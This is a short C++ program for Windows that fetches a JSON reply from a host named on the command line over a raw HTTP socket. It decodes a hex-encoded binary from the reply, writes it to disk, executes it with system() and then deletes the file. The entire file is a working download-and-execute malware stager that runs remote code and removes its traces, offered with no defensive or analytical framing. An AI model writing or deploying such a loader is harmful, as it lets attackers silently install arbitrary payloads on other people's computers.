#include <sstream>
#include <iostream>
#include <fstream>
#include <ios>
#include <winsock2.h>
#pragma comment(lib,"libws2_32.a")
using namespace std;
void HexToFile(string fileName,string hex)
{
  ofstream datafile(fileName.c_str(), ios_base::binary);

  char buf[3];
  buf[2] = 0;

  stringstream input(hex);
  input.flags(ios_base::hex);
  while (input)
  {
      input >> buf[0] >> buf[1];
      long val = strtol(buf, nullptr, 16);
      datafile << static_cast<unsigned char>(val & 0xff);
  }
}
string HttpGet(string url,string urlAction)
{

  WSADATA wsaData;
  SOCKET Socket;
  SOCKADDR_IN SockAddr;
  int lineCount=0;
  int rowCount=0;
  struct hostent *host;
  locale local;
  char buffer[10000];
  int i = 0 ;
  int nDataLength;
  string website_HTML;
  string get_http;
  //HttpGet
  if(urlAction == " ")
  {
    get_http = "GET HTTP/1.1\r\nHost: " + url + "\r\nConnection: close\r\n\r\n";
  }
  else
  {
    get_http = "GET "+ urlAction +" HTTP/1.1\r\nHost: " + url + "\r\nConnection: close\r\n\r\n";
  }

      //initwsa
      if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0)
      {
          return "error";
      }
      //
      Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
      host = gethostbyname(url.c_str());

      SockAddr.sin_port=htons(80);
      SockAddr.sin_family=AF_INET;
      SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);

      if(connect(Socket,(SOCKADDR*)(&SockAddr),sizeof(SockAddr)) != 0)
      {
          return "error";
      }

      // send GET / HTTP
      send(Socket,get_http.c_str(), strlen(get_http.c_str()),0 );

      // recieve html
      while ((nDataLength = recv(Socket,buffer,10000,0)) > 0){
          int i = 0;
          while (buffer[i] >= 32 || buffer[i] == '\n' || buffer[i] == '\r'){

              website_HTML+=buffer[i];
              i += 1;
          }
      }

      closesocket(Socket);
      WSACleanup();
      return website_HTML;
}
string DeserializeJson(string parameter,string htmlResponse)
{
  int initParameter;
  string parameterDeserialize;

  int htmlResponseLenght = htmlResponse.length();
  char char_arrayHtmlResponse[htmlResponseLenght + 1];
  strcpy(char_arrayHtmlResponse, htmlResponse.c_str());

  int parameterLenght = parameter.length();
  char char_arrayParameter[parameterLenght + 1];
  strcpy(char_arrayParameter, parameter.c_str());

    for (int i = 0; i < htmlResponseLenght; i++)
    {
      if(char_arrayHtmlResponse[i] == char_arrayParameter[0]
        && char_arrayHtmlResponse[i+1] == char_arrayParameter[1]
        && char_arrayHtmlResponse[i-1] == '"')
     {
       initParameter = i+parameterLenght+3;
       if(char_arrayHtmlResponse[initParameter] == ' ')
       {
         initParameter = i+parameterLenght+4;
       }
       while(char_arrayHtmlResponse[initParameter] != '"')
       {
         parameterDeserialize += char_arrayHtmlResponse[initParameter];
         initParameter++;
       }
       break;
     }
   }
 return parameterDeserialize;
}
int main(int argc,char *argv[])
{
  string url = argv[1];
  string urlAction = argv[2];
  string hex = DeserializeJson("hex",HttpGet(url,urlAction));
  string fileName = DeserializeJson("filename",HttpGet(url,urlAction));
  HexToFile(fileName,hex);
  system(fileName.c_str());
  remove(fileName.c_str());
  return 0;
}
